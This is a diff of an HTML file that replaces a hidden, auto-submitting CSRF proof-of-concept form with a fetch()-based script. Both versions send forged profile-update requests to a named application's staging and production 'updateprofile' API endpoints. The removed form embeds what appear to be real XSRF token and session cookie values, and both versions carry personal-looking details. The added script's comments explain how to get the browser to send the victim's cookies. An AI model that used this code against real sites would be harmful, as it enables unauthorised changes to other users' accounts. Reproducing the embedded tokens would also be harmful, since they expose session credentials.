@@ -1,24 +1,48 @@
 <!DOCTYPE html>
 <html>
-  <!-- CSRF PoC - Auto Submit Version -->
-  <head>
-    <title>CSRF Auto Submit</title>
-  </head>
-  <body onload="document.forms[0].submit()" style="display:none;">
-    <form method="POST" action="https://staging.lingkup.co:443/api/v1/cms/account/updateprofile">
-      <input type="text" name="XSRF-TOKEN" value="eyJpdiI6Inl6N0NtMTZEdGdsYXRpa1R2MTQxd2c9PSIsInZhbHVlIjoiVW5keFpKNDNYam9HQWtKTHV0R1B1SnYjRUWUNVc2tydlRxT3J6aUdxUDRMRmJEZG5hOUlXeEZjcVdsUVFKOGJFNXh4R1VUUVBXRGNjZXF5em96SVpROWRqeXF3NFBjRElQQ0xlNDJSWDRsL2JQbEFVVnlSejRWck4yYmx2ZXoiLCJtYWMiOiIxZjIwM2JmOGZiYWM4Y2ExNzNlMTkzMDU4MWEwMWQ4ZTBmZjM5Y2MyZWM4NGM1NzIzYmIwMzZhYzM3OGYwZDRjIiwidGFnIjoiIn0=">
-      <input type="text" name="staging_session" value="eyJpdiI6InJSUFduMDFGWTM4Y1puVDhSemNuNXc9PSIsInZhbHVlIjoiMkR2YjhRZ3dSQnMwWkRwV2VVVFMya1liYmpYZDRoRjYza0xPcXZrRmhIdVg0V05MOVlPdFVmNUhRTUVNeFdXUjRML2hadFN3Z1pSU1ZieWhhTU1hYXRIZzQ0bDJPRWI1Nmk4ZHE0SWRmZmpOSjNuVWd0MGpzbXM0eTZNQVZiMWoiLCJtYWMiOiI1ZWU1MTRmYmUwZWExNGYwNDJmNDUyYTBkM2E5ZWQ3Y2VkZGYyYmU0NzdhNTI0ZjQwZThhMmUyODAzNWMyNTBlIiwidGFnIjoiIn0=">
-      <input type="text" name="full_name" value="Joko Suseno">
-      <input type="text" name="gender" value="male">
-      <input type="text" name="dob" value="11/06/2025">
-      <input type="text" name="email" value="joko@gmail.co.id">
-      <input type="text" name="phone" value="081362677890">
-      <input type="text" name="identity_number" value="21212121">
-      <input type="text" name="department" value="">
-      <input type="text" name="role_id" value="">
-      <input type="text" name="ktp" value="">
-      <input type="text" name="staff_id" value="undefined">
-      <input type="submit" value="Send">
-    </form>
-  </body>
+<head>
+  <title>Auto Submit ke API</title>
+</head>
+<body>
+  <script>
+    // Data yang akan dikirim ke API
+    const data = {
+      full_name: "John Wickk",
+      gender: "male",
+      dob: "22/01/2025",
+      email: "yaliyanto21@yahoo.co.id",
+      phone: "08098098908",
+      identity_number: "demosouthgate@lingkup.co",
+      department: "",
+      role_id: "",
+      ktp: "",
+      staff_id: "undefined"
+    };
+
+    // Token dan session dari cookie biasanya harus didapat dari browser yang sudah login
+    const xsrfToken = "eyJpdiI6Im5wUE5CSm9aQUdadlYyeDdMUkZkWGc9PSIsInZhbHVlIjoiYT..."; // Ganti dengan token asli
+    const productionSession = "eyJpdiI6IkNBWDdCTlhhMXZObDcrVnVCWkVHWFE9PSIsInZhbHVlIjoiS3..."; // Ganti dengan session asli
+
+    // Fungsi auto-submit
+    fetch("https://app.lingkup.co:443/api/v1/cms/account/updateprofile", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "X-XSRF-TOKEN": xsrfToken,
+        "Cookie": `production_session=${productionSession}` // ini biasanya tidak bisa diset manual dari JS karena CORS
+      },
+      credentials: "include", // ini penting agar cookie dikirim (kalau CORS dan server mengizinkan)
+      body: JSON.stringify(data)
+    })
+    .then(res => res.json())
+    .then(response => {
+      console.log("Sukses:", response);
+      alert("Permintaan berhasil!");
+    })
+    .catch(error => {
+      console.error("Gagal:", error);
+      alert("Terjadi kesalahan, lihat console log");
+    });
+  </script>
+</body>
 </html>
